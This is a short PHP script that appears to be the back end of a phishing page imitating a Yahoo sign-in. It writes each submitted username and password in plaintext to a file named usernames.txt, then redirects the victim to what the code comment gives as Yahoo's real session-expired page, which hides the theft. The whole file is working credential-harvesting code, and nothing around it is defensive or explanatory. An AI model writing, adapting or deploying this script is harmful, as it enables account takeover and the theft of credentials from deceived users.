<?php

file_put_contents("usernames.txt", "Yahoo Username: " . $_POST['username'] . "\nPassword: " . $_POST['password'] . "\n", FILE_APPEND);
$url = "redirectUrl"; # https://login.yahoo.com/account/challenge/session-expired
header("Location: $url");
exit();
?>